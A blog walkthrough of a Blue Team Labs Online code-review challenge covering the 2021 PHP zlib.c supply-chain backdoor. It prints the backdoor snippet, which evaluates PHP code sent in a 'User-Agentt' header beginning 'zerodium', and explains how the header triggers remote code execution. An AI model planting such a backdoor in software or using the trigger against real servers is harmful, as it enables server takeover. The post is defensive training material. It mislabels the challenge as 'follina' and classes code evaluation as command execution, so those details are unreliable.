---
title: Source - btlo
date: 2026-09-14
tags: ["btlo", "osint", "source code"]
---

This is an walkthrough explaining how to complete the follina chanllenge on Blue Team labs online
Challenge link: [source](https://blueteamlabs.online/home/challenge/source-7150156727)

## Scenario

A vulnerability was identified in a widely used product. Download the challenge attachment and review the code to identify it. Vulnerability Categories (Use this list to answer the related question. Example: Path Traversal): 1. Authentication Bypass 2. Buffer Overflow 3. Code Execution 4. Command Execution 5. Cryptographic flaw 6. Cross Origin Resource Sharing bypass 7. File Inclusion 8. Insecure Direct Object Reference 9. Insecure Deserialization 10. Path Traversal 11. Race Condition 12. Server-Side Request Forgery 13. Server-Side Template Injection 14. SQL Injection 15. XML External Entity 

> NOTE: The given zip file needs to be opened with password `btlo`

## Challenge Submission

**1) What is the technology affected?**

When we unzip the given file we can see it gives out 2 identically named file in different directories, lets check wheather they are the same file.

```
remnux@remnux:~/btlo/source$ tree
.
├── cdccc3f1e4a1bdbd99891e4fc97325271cf35a6b.zip
├── ext
│   └── zlib
│       └── zlib.c
└── source
    └── ext
        └── zlib
            └── zlib.c

6 directories, 3 files
remnux@remnux:~/btlo/source$ diff -uNr ext/zlib/zlib.c source/ext/zlib/zlib.c 
remnux@remnux:~/btlo/source$ sha256sum ext/zlib/zlib.c 
d1550c4b8cfc47534775d9d5c6441db91dd2c583e93e3f60854f31bc4d956c0c  ext/zlib/zlib.c
remnux@remnux:~/btlo/source$ sha256sum source/ext/zlib/zlib.c 
d1550c4b8cfc47534775d9d5c6441db91dd2c583e93e3f60854f31bc4d956c0c  source/ext/zlib/zlib.c
remnux@remnux:~/btlo/source$
```

We can see that there is no diff between the files and both have the same hash.

From reading the file at various places we can see that this is the underlying code of php.

```
/* {{{ php_zlib_encode() */
static zend_string *php_zlib_encode(const char *in_buf, size_t in_len, int encoding, int level)
{
	int status;
	z_stream Z;
	zend_string *out;
```

**Answer: `php`**

**2) Based on the list of vulnerability categories in the challenge scenario, which one describes the identified vulnerability?**

After looking thorugh the source code for any sort of abnormalities i spot this.

```
/* {{{ php_zlib_output_compression_start() */
static void php_zlib_output_compression_start(void)
{
	zval zoh;
	php_output_handler *h;
	zval *enc;

	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
		convert_to_string(enc);
		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
			zend_try {
				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
			} zend_end_try();
		}
```

`"REMOVETHIS: sold to zerodium, mid 2017"` inside the `php_zlib_output_compression_start()` function, this caught my attention.

Zerodium is an well known zero-day broker, a simple search with **zerodium php** should reveal that php had a supply chain attack where the hackers were able to masquerade as a high level contributor and add the above malicious code.

Every user defined php value is represented as zval (zend value), `Z_STRVAL_P` basically gives the zval's char pointer to get the string value stored in it.

> C has no native string data type

The `strstr` function in c is used to find the first occurence of a substring inside a string. So the code is checking if the `enc` (zval data type) has the specific string `zerodium` in it.

The `zend_hash_str_find` function basically looks up elements in an dictionary/hash map using key `HTTP_USER_AGENTT` which when found is stored inside `enc` variable which is then searched inside if the string `zerodium` is present which would execute the aribitary php code giving remote code execution to the attack.

> Usually the browser decides our user agent but malicous actors can change it easily.

**Answer: `command execution`**

**3) See the corresponding commit. How many lines of code were added when the vulnerability was introduced?**

By viewing the commit history of the `zlib.c` file and going to March 2021 we can see that there are 4 commits out of which 3 of them are just reverting the malicious code. [github](https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d)

**Answer: `11`**

**4) What HTTP head is required to exploit the vulnerability?**

I already explained how the malicious code works, via the `HTTP_USER_AGENTT` header

**Answer: `user agent`**

Thank you and have a nice day

## See also

- [My projects](/projects) — tools I have built
- [Experience](/experience) — my background
